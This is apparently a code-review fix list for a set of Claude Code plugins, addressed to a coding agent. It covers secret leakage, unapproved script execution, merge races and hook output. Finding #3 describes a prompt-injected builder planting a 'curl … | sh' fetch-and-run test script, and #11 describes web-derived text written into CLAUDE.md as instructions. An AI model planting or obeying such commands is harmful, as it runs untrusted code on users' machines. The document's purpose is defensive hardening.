# claudemod: code review fixes

Findings from a full review of all seven mods (`plugins/*`). Work through them in order: the **P1** items are bugs or security issues, **P2** are correctness or design problems, and **P3** are small cleanups.

## Ground rules for the agent

- Match the surrounding style: short comments only where they add something, the same naming, and no new dependencies.
- `shared/texts.ts` is the source of truth for the wording mods share. Edit it there, then run `node tools/sync-texts.mjs`. Never edit `plugins/*/hooks/texts.ts` by hand.
- Bump the `version` in each touched mod's `.claude-plugin/plugin.json` (patch for fixes, minor for behavior changes).
- Add or extend a test in the mod's `tests/*.test.tsx` for every P1/P2 fix. TS tests run with `bun test` inside the plugin folder. They need the generated `claude-code/testing` types in `.claude-plugin/types/` (gitignored), so if they can't run in your environment, say so; don't skip writing them.
- The Python skill tests run with `python -m pytest plugins/brain-hud/tests/skill -q`. They pass today (232 tests).
- Work one finding per commit, with a clear message.

---

## P1: fix first

### 1. factory: secrets and dependencies inside a new folder get committed

**Where:** `plugins/factory/hooks/register.tsx` `onBuilt()` (~line 339), `plugins/factory/hooks/flow.ts` `untrackedOf()` (~line 308).

**Problem:** `git status --porcelain` lists a new untracked folder as a single line (`?? app/`). `neverCommit('app/')` is false, so `git add -- app/` stages everything in it, including `app/.env` and `app/node_modules/**`. Verified:

```
?? app/
$ git add -- app/ && git diff --cached --name-only
app/.env
app/index.js
app/node_modules/x/a.js
```

A builder that creates a new folder with a `.env` therefore leaks it into the PR.

**Fix:** run `git status --porcelain -z -uall` (every untracked file listed on its own, NUL-separated, unquoted), and parse the `-z` format in `untrackedOf`. In `-z` mode a rename entry is followed by an extra path field, so handle that when splitting. Keep `neverCommit` as the per-file filter.

**Test:** add a flow test where porcelain output contains `?? app/.env\0?? app/index.js\0`, and assert that only `app/index.js` is kept and `app/.env` is skipped.

### 2. factory: non-ASCII filenames (Hebrew) block the run

**Where:** same as #1.

**Problem:** without `-z`, git octal-escapes non-ASCII paths (`"\327\251\327\234\327\225\327\235.ts"`). `untrackedOf` only strips the quotes, so `git add` fails on a pathspec that doesn't exist, and the run stops with "The builder's work could not be committed".

**Fix:** the `-z` change in #1 fixes this too. Add a test with a Hebrew filename.

### 3. factory: auto-detected checks run builder-written scripts without permission

**Where:** `plugins/factory/hooks/flow.ts` `detectChecks()` / `detectSetup()` (~lines 115–141), `register.tsx` `setUp()` / `runChecks()`.

**Problem:** when the `checks` / `setup` options are empty, the factory runs `npm test`, `npm run lint|typecheck`, `npm ci|install` (lifecycle scripts) and `python -m pytest` (`conftest.py`) through `$.process.run`, in a worktree whose `package.json` / `conftest.py` the builder agent just wrote. Those commands never go through the session's permission prompts. A prompt-injected builder can add `"test": "curl … | sh"` and have the factory run it.

**Fix (pick the smallest that closes it):**
- Before running auto-detected commands for the first time in a run, ask the person with `$.ui.ask` and list the exact commands. Remember the answer on the `Run` (e.g. `checksApproved: true`), and skip the question when the `checks` / `setup` options are set explicitly.
- And/or: detect commands from the base commit's `package.json` (`git show <base>:package.json`), not the worktree's, and warn in the run's note when the builder changed `scripts` or lockfiles.

**Test:** with no `checks` option, the first `runChecks` asks before running anything, and a "no" answer blocks the run (`needs-human`) instead of running.

---

## P2: correctness and design

### 4. factory: `prompt.submit` takes over prompts from any origin

**Where:** `plugins/factory/hooks/register.tsx` `on('prompt.submit', …)` (~line 658), `takeOverArgs()`.

**Problem:** the hook doesn't check `e.origin`. `parseGoalPrompt` uses the `/m` flag, so a message the person types that has a line starting `My goal for this session:` (or a line `- id x: …`) starts a factory run and replaces their text.

**Fix:** only take over when `e.origin.kind === 'plugin'` and `e.origin.name` is `goal-run` (goal prompt) or `followups` (start prompt). Add a test that a composer prompt with the same text passes through untouched.

### 5. factory: non-Latin features all get the slug `feature`

**Where:** `plugins/factory/hooks/flow.ts` `slugOf()` (~line 164).

**Problem:** everything outside `a-z0-9` is stripped, so every Hebrew feature becomes `feature`, `feature-2` … and after `MAX_SLUG_TRIES` (5) runs `start()` fails with "all taken".

**Fix:** when the Latin slug is empty (or always), append a short stable suffix, e.g. a base36 hash of the feature text or the start time: `feature-k3x9a`. Keep it git-ref-safe and at most ~48 chars.

### 6. factory: `takeOver` defaults to `on` and changes other mods' behavior

**Where:** `plugins/factory/.claude-plugin/plugin.json` (`takeOver` default), README factory section.

**Problem:** installing factory silently routes every goal typed in goal-run, and every single-item Start in followups, into the full spec → worktree → build → review pipeline.

**Fix:** decide with the owner. Either default `takeOver` to `off`, or keep `on` and state it prominently in the README's factory, goal-run and followups sections. **Ask before changing the default.**

### 7. goal-run: a store write on every model step

**Where:** `plugins/goal-run/hooks/register.tsx` `on('turn.step', …)` (~line 621).

**Problem:** each API request (sub-agents' too) calls `setGoal` → `save()` → `$.store.get` + `$.store.set`.

**Fix:** update the in-memory `goal` atom per step (`update`, not `setGoal`), and persist once per turn in `turn.complete` (main loop, `agentId === undefined`) and in `session.end`. Make sure `syncTicking` still runs when a task's status changes; token counting doesn't affect it.

### 8. goal-run: concurrent sessions overwrite each other's progress

**Where:** `plugins/goal-run/hooks/register.tsx` `save()` / `sync()` (~lines 230–284).

**Problem:** the sync is last-write-wins on the whole `Goal`. Two sessions working on the same goal drop each other's task status and token changes.

**Fix:** do a three-way merge per task like followups' `mergeLists` (base = `seen`). Per task id: a status changed here wins, otherwise take the stored one; tokens take the max (or `base + Δmine + Δtheirs`). Keep the existing "a newer `setAt` goal wins" rule for a different goal. Add tests for both sides changing different tasks.

### 9. shared/texts: `parseStartPrompt` truncates titles that contain ` — `

**Where:** `shared/texts.ts` `parseStartPrompt()`.

**Problem:** the title group `(.+?)` is lazy, so `- id 1: Fix A — B — detail` parses with the title `Fix A`. goal-run and brain-hud then match items by a wrong title.

**Fix:** make the line unambiguous. Either escape ` — ` inside the title / detail in `startLine`, or change the format so the title is delimited (e.g. a JSON-quoted title: `- id 1: "Fix A — B" — detail`). Update the parser, run `node tools/sync-texts.mjs`, and add round-trip tests (`parseStartPrompt(startLine(x))` returns `x.title`) with titles containing ` — `, ` (bug)` and `[where:`.

### 10. brain-hud / mistake-brain: the Stop hook's context probably never reaches Claude

**Where:** `plugins/brain-hud/skills/mistake-brain/hooks/revert_stop_hook.py` `_emit()`.

**Problem:** it prints `hookSpecificOutput.additionalContext` with `hookEventName: "Stop"`. Claude Code's Stop hooks take `decision` / `reason`, not `additionalContext`, so the reminder is likely dropped. The text also says "before completing the turn", but the turn is already ending.

**Fix:** check against the current Claude Code hooks docs. If Stop has no `additionalContext`, either emit `{"decision": "block", "reason": "<the reminder>"}` (it sends Claude back once, so guard it with `stop_hook_active` from the payload), or drop the emit and rely on `brief_on_session_start.py` / the inbox. Update `tests/skill` accordingly.

---

## P3: smaller issues

| # | Mod | Where | Issue | Fix |
|---|---|---|---|---|
| 11 | followups | `register.tsx` `exportTo()` | Export to `CLAUDE.md` writes titles that came from haiku or sub-agent reports (possibly web content) into a file Claude reads as instructions. | Strip / neutralize instruction-like text, or render items as quoted code (`` `title` ``) in the Memory target. |
| 12 | followups | `register.tsx` `start()` | If the session ends before `prompt.submit` resolves, items stay `in_progress` forever. | On `session.start`, reset `in_progress` items with no live start back to `open` (or offer to). |
| 13 | goal-run | `register.tsx` `planItems()` | Blank titles are filtered *after* mapping, so `dependsOn` indexes shift. | Map the original 1-based indexes to the filtered indexes before `orderPlan`. |
| 14 | goal-run | `UPDATE_TOOL` handler | The "Goal reached" toast repeats on each update of an already-done goal. | Toast only when the status changes to `done`. |
| 15 | task-hud | `agent.spawn` | `slice(-KEEP_AGENTS)` can drop a still-running agent. | Drop the oldest *finished* agents first. |
| 16 | task-hud | `setTodos()` | The title only updates when the list was empty; a new prompt with a new unfinished list keeps the old title. | Also update the title when the first `TodoWrite` of a new main-loop turn replaces the list. |
| 17 | task-hud | `activityOf('Skill')` | Shows "undefined skill" when `input.skill` is missing. | Fall back to `'a skill'`. |
| 18 | brain-hud | `register.tsx` poll | The 4s poll (3 stats + 4 listings) runs forever in projects with no memory. | Poll slower (e.g. 30s) while `scan()` returns null. |
| 19 | brain-hud | `writeJournal()` | `keepOutOfGit` runs only when `entries.length === 1`; one failure is never retried. | Track a module flag `excluded` and retry until it succeeds. |
| 20 | mistake-brain | `draft_mistake_on_revert.py` | Writes the full command into `MISTAKES.md` (can contain tokens), and a backtick breaks the markdown. | Redact obvious secrets (`token=`, `Bearer `, `ghp_…`, `sk-…`) and escape backticks. |
| 21 | factory | `session.start` timer | The 700ms `tick` timer runs for the whole session even with no run. | Start it with a run, and stop it when the run isn't live. |
| 22 | clawd-hud | `register.tsx` | The 125ms frame timer runs even when no surface draws the band. | Optional: stop it after N idle seconds with no `AbovePrompt` render. Low priority. |

---

## Repo-wide

### 23. CI runs no TS tests

`.github/workflows/` runs only the mistake-brain pytest and `sync-texts --check`. ~4,900 lines of TS tests never run in CI. Add a workflow that installs bun, generates or fetches the `claude-code` types, and runs `bun test` in each `plugins/*`. If the types can't be fetched in CI, at least run `tsc --noEmit` on the pure modules (`flow.ts`, `rtl.ts`, `brain.ts`, `journal.ts`, `gauges.ts`, `shared/texts.ts`). **Ask the owner how the types are produced before building this.**

### 24. Duplicated helpers

`tok`, `clip`, `mmss`, `projectOf` / `projects`, `readTheme` and `keepOutOfGit` are copied across 4–5 mods. Optional: extend `tools/sync-texts.mjs` to also copy a `shared/util.ts` into each mod. Do this only after P1/P2 land, as its own commit.

---

## Not issues (checked, leave as is)

- rtl-toggle: the LRU and streaming memo, and the backtracking-safe regexes, are fine.
- followups `mergeLists`: key order stays stable through `migrate`, so the JSON comparison is sound.
- factory `serial()` queue: completions are correctly ordered after the spawn that records the agent id.
- clawd-hud loop detector: correctly best-effort, with `.catch`.
